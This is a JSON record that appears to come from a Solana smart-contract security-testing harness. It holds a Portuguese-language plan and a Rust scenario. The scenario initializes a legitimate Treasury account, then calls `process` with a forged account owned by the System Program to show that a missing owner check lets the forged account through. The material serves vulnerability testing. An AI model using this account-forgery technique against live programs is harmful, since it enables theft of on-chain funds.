{
  "plan": "O cenário inicializa uma conta Treasury legítima via `initialize` (baseline) para provar que o programa aceita a conta correta. Em seguida, o ataque chama `process` passando uma conta forjada pelo atacante, com dono diferente do programa (ex.: System Program), contendo dados que imitam um Treasury ativo. O efeito medido é que a instrução aceita a conta forjada e executa com sucesso, demonstrando a falta de verificação de dono.",
  "scenario": "let authority = Pubkey::new_unique();
let treasury_key = Pubkey::new_unique();

// Baseline: inicializa uma conta Treasury legítima
let init_ix = env.anchor_ix(
    "initialize",
    &(1000u64,),
    vec![
        AccountMeta::new(treasury_key, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(solana_program::system_program::id(), false),
    ],
);
let init_accounts = vec![
    (treasury_key, empty_account()),
    (authority, wallet(1_000_000_000)),
    system_program_account(),
];
let baseline_result = env.baseline("initialize treasury", &init_ix, &init_accounts);

// Extrai a conta Treasury criada pelo baseline
let treasury_account = baseline_result
    .resulting_accounts
    .iter()
    .find(|(k, _)| *k == treasury_key)
    .map(|(_, a)| a.clone())
    .unwrap_or_else(|| account(&env.program_id, &anchor_account_data("Treasury", &(authority, 1000u64, true)), None));

// Ataque: chama process com uma conta forjada (dono diferente do programa)
let forged_data = anchor_account_data("Treasury", &(authority, 1000u64, true));
let forged_account = account(&solana_program::system_program::id(), &forged_data, None);

let attack_ix = env.anchor_ix(
    "process",
    &(),
    vec![
        AccountMeta::new_readonly(treasury_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);
let attack_accounts = vec![
    (treasury_key, forged_account),
    (authority, wallet(1_000_000_000)),
];

let attack_result = env.attack("process with forged treasury owner", &attack_ix, &attack_accounts);

if attack_result.program_result == ProgramResult::Success {
    let forged_after = after(&attack_result, &treasury_key);
    env.effect(
        "forged treasury account with non-program owner was accepted",
        forged_after.owner() != &env.program_id,
    );
}"
}

